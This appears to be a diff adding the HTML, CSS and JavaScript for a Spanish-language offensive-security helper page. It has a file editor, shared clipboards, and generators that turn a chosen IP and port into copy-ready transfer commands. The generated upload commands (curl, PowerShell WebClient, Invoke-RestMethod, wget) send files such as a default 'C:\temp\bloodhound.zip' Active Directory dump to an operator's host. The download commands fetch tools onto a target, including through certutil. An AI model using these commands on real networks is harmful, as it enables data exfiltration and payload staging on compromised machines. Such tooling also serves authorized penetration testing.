@@ -1,0 +1,513 @@
+  
+
+
+<style>
+  #file-list {
+    width: 20%;
+    min-width: 200px;
+    max-width: 300px;
+    height: 80vh;
+    padding: 20px;
+    border-right: 1px solid #444;
+    box-sizing: border-box;
+    overflow-y: auto;
+    background: #222;
+    color: #0f0;
+  }
+
+  body.light-mode #file-list {
+    background: #ddd;
+    color: #111;
+    border-right: 1px solid #bbb;
+  }
+
+  #editor {
+    flex: 1;
+    padding: 20px;
+    padding-top: 0;
+    box-sizing: border-box;
+    overflow-y: auto;
+  }
+
+  #file-list h3, #editor h3 {
+    margin-top: 0;
+    font-family: monospace;
+  }
+
+  .file-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 10px;
+  }
+
+  .file-item button {
+    background: #333;
+    border: none;
+    color: #0f0;
+    padding: 5px 10px;
+    cursor: pointer;
+    font-family: monospace;
+    font-size: 14px;
+  }
+
+  body.light-mode .file-item button {
+    background: #ccc;
+    color: #111;
+  }
+
+  .tabs {
+    display: flex;
+    margin-bottom: 20px;
+  }
+
+  .tab {
+    padding: 10px 20px;
+    cursor: pointer;
+    background-color: #333;
+    color: #0f0;
+    margin-right: 5px;
+    font-family: monospace;
+    font-size: 14px;
+    border: none;
+  }
+
+  body.light-mode .tab {
+    background-color: #ccc;
+    color: #111;
+  }
+
+  .tab.active {
+    background-color: #0f0;
+    color: #111;
+  }
+
+  textarea {
+    width: 100%;
+    height: 50vh;
+    background: #111;
+    color: #0f0;
+    border: 1px solid #444;
+    padding: 10px;
+    font-family: monospace;
+  }
+
+  body.light-mode textarea {
+    background: #fff;
+    color: #111;
+    border: 1px solid #bbb;
+  }
+
+  .clipboard {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 20px;
+    gap: 10px;
+  }
+
+  .clipboard textarea {
+    width: 32%;
+    height: 100px;
+  }
+
+  .upload-area, .download-area {
+    display: none;
+  }
+
+  .upload-area.active, .download-area.active {
+    display: block;
+  }
+</style>
+
+
+<div id="content">
+  <div id="file-list">
+    <h3>Archivos</h3>
+    <input type="text" id="file-search" placeholder="Buscar archivos..." oninput="filterFiles()" />
+    <div id="files"></div>
+  </div>
+
+  <div id="editor">
+    <h3>
+      <div class="tabs">
+        <div class="tab active" id="editor-tab">Editor</div>
+        <div class="tab" id="upload-tab">Upload</div>
+        <div class="tab" id="download-tab">Download</div>
+      </div>
+    </h3>
+
+    <div id="editor-content" class="active">
+      <textarea id="file-content" placeholder="Selecciona un archivo para ver o editar su contenido"></textarea>
+      <button id="save-button" disabled>Save</button>
+
+      <div class="clipboard">
+        <textarea id="clipboard-1" placeholder="Clipboard 1"></textarea>
+        <textarea id="clipboard-2" placeholder="Clipboard 2"></textarea>
+        <textarea id="clipboard-3" placeholder="Clipboard 3"></textarea>
+      </div>
+    </div>
+
+    <div id="upload-area" class="upload-area">
+      <h3>Upload file to remote host</h3>
+      <div id="command-line">
+        <label for="file-field">File:</label>
+        <input type="text" id="download-file-field" placeholder="Nombre del archivo" list="file-suggestions" />
+        <datalist id="file-suggestions"></datalist>
+
+        <label for="upload-port-field">Port:</label>
+        <input type="number" id="download-port-field" placeholder="80" value="80" />
+
+        <label for="ip-select">IP:</label>
+        <select class="ip-select" id="download-ip-select"></select>
+
+        <button id="download-generate-command">Generar Comando</button>
+        <p id="download-command-output"></p>
+      </div>
+    </div>
+
+    <div id="download-area" class="download-area">
+      <h3>Download file to this host</h3>
+      <input type="file" id="file-input" />
+      <button id="upload-button">Upload</button>
+      <p id="upload-status"></p>
+
+      <h3>Command Line</h3>
+      <div id="command-line">
+        <label for="upload-file-field">File:</label>
+        <input type="text" id="upload-file-field" placeholder="C:\temp\bloodhound.zip" value="C:\temp\bloodhound.zip" />
+        <label for="upload-port-field">Port:</label>
+        <input type="number" id="upload-port-field" placeholder="5000" value="5000" />
+        <label for="ip-select">IP:</label>
+        <select class="ip-select" id="upload-ip-select"></select>
+
+        <button id="upload-generate-command">Generar Comando</button>
+        <p id="upload-command-output"></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<script>
+function initTools() {
+  console.log("[*] Inicializando Tools...");
+
+  initDarkMode();
+  initTabs();
+  initFileManager();
+  initUploadDownload();
+}
+
+// -------------- DARK MODE ---------------
+function initDarkMode() {
+  const toggleBtn = document.getElementById('toggle-mode');
+  if (!toggleBtn) return;
+
+  toggleBtn.onclick = () => {
+    document.body.classList.toggle('dark-mode');
+    const isDark = document.body.classList.contains('dark-mode');
+    toggleBtn.textContent = isDark ? 'Clear' : 'Dark';
+  };
+}
+
+// -------------- TABS ---------------
+function initTabs() {
+  const editorTab = document.getElementById('editor-tab');
+  const uploadTab = document.getElementById('upload-tab');
+  const downloadTab = document.getElementById('download-tab');
+
+  editorTab.onclick = () => {
+    document.getElementById('editor-content').style.display = 'block';
+    document.getElementById('upload-area').style.display = 'none';
+    document.getElementById('download-area').style.display = 'none';
+    editorTab.classList.add('active');
+    uploadTab.classList.remove('active');
+    downloadTab.classList.remove('active');
+  };
+
+  uploadTab.onclick = () => {
+    document.getElementById('editor-content').style.display = 'none';
+    document.getElementById('upload-area').style.display = 'block';
+    document.getElementById('download-area').style.display = 'none';
+    editorTab.classList.remove('active');
+    uploadTab.classList.add('active');
+    downloadTab.classList.remove('active');
+  };
+
+  downloadTab.onclick = () => {
+    document.getElementById('editor-content').style.display = 'none';
+    document.getElementById('upload-area').style.display = 'none';
+    document.getElementById('download-area').style.display = 'block';
+    editorTab.classList.remove('active');
+    uploadTab.classList.remove('active');
+    downloadTab.classList.add('active');
+  };
+}
+
+// -------------- FILE MANAGER ---------------
+function initFileManager() {
+  fetchFiles();
+  fetchClipboards();
+}
+
+// Copiar texto
+function copyToClipboard(id) {
+  let text = document.getElementById(id).innerText;
+  navigator.clipboard.writeText(text);
+}
+
+// Cargar archivos del servidor
+let allFiles = [];
+
+async function fetchFiles() {
+  const response = await fetch('/files');
+  allFiles = await response.json();
+  displayFiles(allFiles);
+  updateFileSuggestions(allFiles);
+}
+
+function displayFiles(files) {
+  const filesDiv = document.getElementById('files');
+  filesDiv.innerHTML = '';
+
+  files.forEach(file => {
+    const fileItem = document.createElement('div');
+    fileItem.className = 'file-item';
+
+    const fileName = document.createElement('span');
+    fileName.textContent = file;
+
+    const buttonContainer = document.createElement('div');
+    buttonContainer.style.display = 'flex';
+
+    const viewButton = document.createElement('button');
+    viewButton.textContent = 'Edit';
+    viewButton.onclick = () => loadFile(file);
+
+    const downloadButton = document.createElement('button');
+    downloadButton.textContent = 'Descargar';
+    downloadButton.onclick = () => downloadFile(file);
+
+    buttonContainer.appendChild(viewButton);
+    buttonContainer.appendChild(downloadButton);
+    fileItem.appendChild(fileName);
+    fileItem.appendChild(buttonContainer);
+    filesDiv.appendChild(fileItem);
+  });
+}
+
+function updateFileSuggestions(files) {
+  const fileSuggestions = document.getElementById('file-suggestions');
+  fileSuggestions.innerHTML = '';
+  files.forEach(file => {
+    const option = document.createElement('option');
+    option.value = file;
+    fileSuggestions.appendChild(option);
+  });
+}
+
+function filterFiles() {
+  const searchTerm = document.getElementById('file-search').value.toLowerCase();
+  const filteredFiles = allFiles.filter(file => file.toLowerCase().includes(searchTerm));
+  displayFiles(filteredFiles);
+}
+
+async function loadFile(filename) {
+  const response = await fetch(`/files/${filename}`);
+  const data = await response.json();
+  if (data.content) {
+    document.getElementById('file-content').value = data.content;
+    document.getElementById('save-button').disabled = false;
+    document.getElementById('save-button').onclick = () => saveFile(filename);
+  } else {
+    alert('Error al cargar el archivo');
+  }
+}
+
+async function saveFile(filename) {
+  const content = document.getElementById('file-content').value;
+  await fetch(`/files/${filename}`, {
+    method: 'PUT',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content })
+  });
+  alert('Archivo guardado');
+}
+
+function downloadFile(filename) {
+  window.location.href = `/download/${filename}`;
+}
+
+// -------------- CLIPBOARDS ---------------
+async function fetchClipboards() {
+  const response = await fetch('/clipboards');
+  const clipboards = await response.json();
+  document.getElementById('clipboard-1').value = clipboards[0];
+  document.getElementById('clipboard-2').value = clipboards[1];
+  document.getElementById('clipboard-3').value = clipboards[2];
+
+  document.getElementById('clipboard-1').oninput = () => updateClipboard(0);
+  document.getElementById('clipboard-2').oninput = () => updateClipboard(1);
+  document.getElementById('clipboard-3').oninput = () => updateClipboard(2);
+}
+
+async function updateClipboard(index) {
+  const content = document.getElementById(`clipboard-${index + 1}`).value;
+  await fetch(`/clipboards/${index}`, {
+    method: 'PUT',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ content })
+  });
+}
+
+// -------------- UPLOAD & DOWNLOAD ---------------
+function initUploadDownload() {
+  initIPSelection();
+  initUploadDownloadCommands();
+}
+
+async function initIPSelection() {
+  try {
+    const response = await fetch('/ips');
+    const ips = await response.json();
+    const selects = document.getElementsByClassName('ip-select');
+    Array.from(selects).forEach(select => {
+      ips.forEach(ip => {
+        const option = document.createElement('option');
+        option.value = ip;
+        option.textContent = ip;
+        select.appendChild(option);
+      });
+    });
+  } catch (error) {
+    console.error('Error obteniendo IPs:', error);
+  }
+}
+
+function initUploadDownloadCommands() {
+  const uploadGenerateBtn = document.getElementById('upload-generate-command');
+  const downloadGenerateBtn = document.getElementById('download-generate-command');
+
+  uploadGenerateBtn.onclick = generateUploadCommands;
+  downloadGenerateBtn.onclick = generateDownloadCommands;
+}
+
+
+function generateUploadCommands() {
+  const file = document.getElementById('upload-file-field').value;
+  const port = document.getElementById('upload-port-field').value;
+  const ip = document.getElementById('upload-ip-select').value;
+
+  if (!file || !port || !ip) {
+    alert('Completa todos los campos');
+    return;
+  }
+
+  const uploadWindows = [
+    `& curl.exe --upload-file "${file}" http://${ip}:${port}/upload/${file.split('\\').pop()}`,
+    `Invoke-RestMethod -Uri http://${ip}:${port}/upload/${file.split('\\').pop()} -Method PUT -InFile "${file}"`,
+    `(New-Object System.Net.WebClient).UploadFile('http://${ip}:${port}/upload/${file.split('\\').pop()}', '${file}')`,
+    `curl.exe -F 'file=@${file}' http://${ip}:${port}/upload/${file.split('\\').pop()}`,
+    `iwr -uri http://${ip}:${port}/upload/${file.split('\\').pop()} -Method Put -InFile '${file}' -UseBasicParsing`
+  ];
+
+  const uploadLinux = [
+    `curl -X POST -F 'file=@${file}' http://${ip}:${port}/upload/${file.split('/').pop()}`,
+    `wget --method=PUT --body-file=${file} --header="Content-Length: $(wc -c < ${file})" --header="Content-Type: application/octet-stream" http://${ip}:${port}/upload/${file.split('/').pop()}`
+  ];
+
+  let outputHTML = `<strong>Upload Commands (Windows):</strong><br>` +
+    uploadWindows.map((cmd, idx) => `
+      <div>
+        <button onclick="copyToClipboard('command-upload-${idx}')">Copiar</button>
+        <code id="command-upload-${idx}">${cmd}</code>
+      </div>`).join('') +
+    `<br><strong>Upload Commands (Linux):</strong><br>` +
+    uploadLinux.map((cmd, idx) => `
+      <div>
+        <button onclick="copyToClipboard('command-upload-${idx + uploadWindows.length}')">Copiar</button>
+        <code id="command-upload-${idx + uploadWindows.length}">${cmd}</code>
+      </div>`).join('');
+
+  document.getElementById('upload-command-output').innerHTML = outputHTML;
+}
+
+
+
+
+
+/*
+function generateUploadCommands() {
+  const file = document.getElementById('upload-file-field').value;
+  const port = document.getElementById('upload-port-field').value;
+  const ip = document.getElementById('upload-ip-select').value;
+
+  if (!file || !port || !ip) {
+    alert('Completa todos los campos');
+    return;
+  }
+
+  const uploadWindows = [
+    `(New-Object System.Net.WebClient).UploadFile('http://${ip}:${port}/', '${file}')`,
+    `curl.exe -F 'file=@${file}' http://${ip}:${port}/`,
+    `iwr -uri http://${ip}:${port}/ -Method Post -InFile '${file}' -UseBasicParsing`
+  ];
+  const uploadLinux = [
+    `curl -X POST -F 'file=@${file}' http://${ip}:${port}/`,
+    `wget --method=POST --header="Content-Type: multipart/form-data" --body-file=${file} http://${ip}:${port}/`
+  ];
+
+  let outputHTML = `<strong>Upload Commands (Windows):</strong><br>` +
+    uploadWindows.map((cmd, idx) => `
+      <div>
+        <button onclick="copyToClipboard('command-upload-${idx}')">Copiar</button>
+        <code id="command-upload-${idx}">${cmd}</code>
+      </div>`).join('') +
+    `<br><strong>Upload Commands (Linux):</strong><br>` +
+    uploadLinux.map((cmd, idx) => `
+      <div>
+        <button onclick="copyToClipboard('command-upload-${idx + uploadWindows.length}')">Copiar</button>
+        <code id="command-upload-${idx + uploadWindows.length}">${cmd}</code>
+      </div>`).join('');
+
+  document.getElementById('upload-command-output').innerHTML = outputHTML;
+}
+*/
+function generateDownloadCommands() {
+  const file = document.getElementById('download-file-field').value;
+  const port = document.getElementById('download-port-field').value;
+  const ip = document.getElementById('download-ip-select').value;
+
+  if (!file || !port || !ip) {
+    alert('Completa todos los campos');
+    return;
+  }
+
+  const downloadWindows = [
+    `curl http://${ip}:${port}/download/${file} -o ${file}`,
+    `certutil.exe -f -urlcache -split http://${ip}:${port}/download/${file}`,
+    `iwr -uri http://${ip}:${port}/download/${file} -OutFile ${file}`,
+    `iwr -UseBasicParsing http://${ip}:${port}/download/${file} -OutFile ${file}`
+  ];
+  const downloadLinux = [
+    `wget http://${ip}:${port}/download/${file}`,
+    `curl -O http://${ip}:${port}/download/${file}`
+  ];
+
+  let outputHTML = `<strong>Download Commands (Windows):</strong><br>` +
+    downloadWindows.map(cmd => `
+      <div>
+        <button onclick="navigator.clipboard.writeText('${cmd}')">Copy</button>
+        <span>${cmd}</span>
+      </div>`).join('') +
+    `<br><br><strong>Download Commands (Linux):</strong><br>` +
+    downloadLinux.map(cmd => `
+      <div>
+        <button onclick="navigator.clipboard.writeText('${cmd}')">Copy</button>
+        <span>${cmd}</span>
+      </div>`).join('');
+
+  document.getElementById('download-command-output').innerHTML = outputHTML;
+}
+</script>
+
